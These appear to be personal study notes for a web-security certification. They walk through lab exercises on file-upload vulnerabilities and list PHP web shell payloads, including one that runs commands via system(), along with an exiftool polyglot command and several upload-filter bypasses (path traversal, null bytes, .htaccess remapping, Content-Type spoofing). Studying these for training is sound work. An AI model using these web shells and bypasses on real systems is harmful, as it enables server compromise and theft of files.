## Stage 3
### What is it?
A more versatile web shell may look something like this:
`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:
`GET /example/exploit.php?command=id HTTP/1.1`

### File Upload Bypass Techniques
1. Upload the file name and include obfuscated path traversal `..%2fexploit.php` and retrieve the content `GET /files/avatars/..%2fexploit.php`.
2. Upload a file named, `exploit.php%00.jpg` with trailing null byte character and get the file execution at `/files/avatars/exploit.php`.
3. Create **polygot** using valid image file, by running the command in bash terminal: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php`. Once polygot is uploaded, view the extracted data by issuing a GET request to the uploaded path `/files/avatars/polyglot.php` , and search the response content for the phrase `START` to obtain the sensitive data.
4. Upload two different files. First upload `.htaccess` with Content-Type: `text/plain`, and the file data value set to `AddType application/x-httpd-php .l33t`. This will allow the upload and execute of second file upload named, `exploit.l33t` with extension `l33t`.
	1. Or just do `.phar`
5. MIME type `image/jpeg` or `image/png` is only allowed. Bypass the filter by specifying `Content-Type` to value of `image/jpeg` and then uploading `exploit.php` file.
6. If target allow [Remote File Include](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#remote-file-inclusion) (RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: `GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>`. The file name on exploit server could read `image.php%00.gif`.
7. Double file extension bypass filter `exploit.csv.php`.

>[!tip] How to Identify this Vulnerability?
>1. File upload feature

### Identify Vulnerabilities in Exam
Upload feature
`get_file_content.php` is at `cd /Users/shixian/Documents/Hax/bscp/webshells`

- After uploading `.php` file
	- `GET /.../{FILE}.php`
		- 200 OK
			- [[File Uploads#3.1. Lab Remote code execution via web shell upload ⭕️]]
			- [[File Uploads#3.3. Lab Web shell upload via path traversal ⭕️]]
		- "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed..."
			- **Solution:** Change the `Content-Type` to `image/png` > refresh and check `GET` request for secret
			- [[File Uploads#3.2. Lab Web shell upload via Content-Type restriction bypass ⭕️]]
	- `POST /my-account/avatar`
		- "Sorry, php files are not allowed" / `Apache/2.4.41`
			- **Solution:** Try `.phar`, if not, follow the lab
			- [[File Uploads#3.4. Lab Web shell upload via extension blacklist bypass ⭕️]]
		- "Sorry, only JPY & PNG files are allowed"
			- **Solution:** Add a null byte like `get_file_content.php%00.png` then to get the content remove the null byte like `GET /files/avatars/get_file_content.php`
			- [[File Uploads#3.5. Lab Web shell upload via obfuscated file extension ⭕️]]
		- "Error: file is not a valid image"
			- [[File Uploads#3.6. Lab Remote code execution via polyglot web shell upload ⭕️]]




---
#### 3.1. Lab: Remote code execution via web shell upload ⭕️
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and notice a file upload feature to upload a picture as your avatar. Notice a `GET` request retrieving the image you uploaded -- Send to Repeater.
	1. ![[File Uploads-20260116162236674.png]]
2. On your machine, create a file and paste the following payload in it: `<?php echo file_get_contents('/home/carlos/secret'); ?>` with the `.php` extension.
	1. ![[File Uploads-20260116162535403.png]]
3. Upload it and find the `GET` request retrieving that file, grab the secret, submit and solve.
	1. ![[File Uploads-20260116162613106.png]]
>[!tip] How to Identify this Vulnerability?
>1. File upload feature
>2. `GET` request to retrieve the image you uploaded like `GET /files/avatars/bird.png`

---
#### 3.2. Lab: Web shell upload via Content-Type restriction bypass ⭕️
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login, uploading the `.php` web shell from Lab 1 will get this error: "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file."
	1. ![[File Uploads-20260116163338831.png]]
2. Grab the `POST /my-account/avatar` request and send to Repeater. Change the `Content-Type` to `image/png` and Send. Success.
	1. ![[File Uploads-20260116163559773.png]]
3. Refresh or go back to My Account, check HTTP History and find the `GET` request that retrieves your `.php` file, get the secret, submit and solve.
	1. ![[File Uploads-20260116163710002.png]]
---
#### 3.3. Lab: Web shell upload via path traversal ⭕️
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and upload your `.php` file from Lab 1. Check the `GET` request of your uploaded file and notice it didn't execute the file but instead it just prints back the contents.
	1. ![[File Uploads-20260116164045820.png]]
2. Send the `POST /my-account/avatar` request to Repeater. Add `../` in front of your filename and Send. Notice the response says `avatars/get_file_content.php has been uploaded` without `../` meaning that the server stripped the directory traversal sequence. 
	1. ![[File Uploads-20260116164320702.png]]
3. URL encode the `/` character to `%2f` and Send again. Now we see `avatars/../get_file_content.php has been uploaded`.
	1. ![[File Uploads-20260116164543266.png]]
4. The `../` indicates that we uploaded our `.php` web shell one directory above `avatars` hence the `GET` request in Step 1 didn't work. Use that same `GET` request and Send this: `GET /file/get_file_content.php`. Submit and solve.
	1. ![[File Uploads-20260116164810947.png]]
>[!tip] How to Identify this Vulnerability?
>1. Response prints out contents of uploaded file but doesn't execute


**For the exam**
Retrieve the content `GET /files/avatars/..%2fexploit.php`.

---
#### 3.4. Lab: Web shell upload via extension blacklist bypass ⭕️
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and upload the `.php` web shell and the `POST /my-account/avatar` response show an error. *Notice the Server is running `Apache`*. Send to Repeater.
	1. ![[File Uploads-20260116165834161.png]]
2. Set the request to the following: `filename=".htaccess`, `Content-Type: text/plain`, `AddType application/x-httpd-php .l33t` and Send.
	1. ![[File Uploads-20260116170449850.png]]
>This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`.
3. Click the back arrow in Request, replace `.php` with `.l33t`, Send, success.
	1. ![[File Uploads-20260116170605941.png]]
4. Refresh My account > check HTTP History > get secret and submit to solve.
	1. ![[File Uploads-20260116170653624.png]]
>[!tip] How to Identify this Vulnerability?
>1. Error in response indicates a denylist of file extensions "php files are not allowed"
>2. Server running `Apache`


**For the exam, can try `.phar` instead of `.l33t`.


---
#### 3.5. Lab: Web shell upload via obfuscated file extension ⭕️
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login > upload `.php` > got error "Sorry, only JPY & PNG files are allowed". Send this `POST` request to Repeater. 
	1. ![[File Uploads-20260116170933372.png]]
2. Append a null byte (`%00`) and `.png` to the filename like `get_file_content.php%00.png`. Send and success.
	1. ![[File Uploads-20260116171249857.png]]
3. Refresh My account > grab the `GET` request retrieving the file, send to Repeater, remove `%00.png`, Send, submit the secret and solve.
	1. ![[File Uploads-20260116171404423.png]]
>[!tip] How to Identify this Vulnerability?
>1. Error in response indicates an allowlist of file extensions "only jpg and png are allowed"
>2. Changing `Content-Type: image/png` doesn't work

---
#### 3.6. Lab: Remote code execution via polyglot web shell upload ⭕️
This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
1. Login, upload `.php` and got error. Also, every technique from previous labs doesn't work.
	1. ![[File Uploads-20260116171830149.png]]
2. Create a polygot:
	1. You'll need a legitimate normal image (`block.png`) then run the following command and our exploit file will be `polyglot.php`. Replace *Your-INPUT-IMAGE* with the filename of your image file.
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.png -o polyglot.php
```
![[File Uploads-20260116172423873.png]]
>[!info] What is a Polyglot?
>A **polyglot** is a single file that is valid in two or more different file formats, allowing it to masquerade as a harmless file (like an image) while containing hidden, malicious code.
3. Upload the `polyglot.php` file and success. Find the `GET` request retrieving the ployglot file, search for `Start` then submit the secret to solve.
	1. ![[File Uploads-20260116172753138.png]]
	2. ![[File Uploads-20260116172907002.png]]
>[!tip] How to Identify this Vulnerability?
>1. Upload feature only accepts image files (validates the content of the file)

---
